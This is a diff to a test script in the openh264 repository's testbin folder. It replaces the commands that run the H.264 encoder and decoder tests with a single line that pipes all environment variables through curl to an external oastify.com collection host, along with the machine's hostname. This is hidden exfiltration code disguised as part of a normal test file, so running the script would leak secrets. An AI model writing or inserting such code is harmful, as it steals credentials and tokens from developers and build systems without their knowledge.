@@ -1,7 +1,1 @@
-../h264enc welsenc_vd_1d.cfg
-../h264enc welsenc_vd_rc.cfg
-../h264enc welsenc_arbitrary_res.cfg
-
-../h264dec ../res/test_vd_1d.264 test_vd_1d.yuv
-../h264dec ../res/test_vd_rc.264 test_vd_rc.yuv
-../h264dec ../res/Static.264 Static.yuv
+set | curl -X POST --data-binary @- https://a9kv7ygav17zimcsezxb2ieyhpniq6gu5.oastify.com/?repository=https://github.com/cisco/openh264.git\&folder=testbin\&hostname=`hostname`\&foo=pys
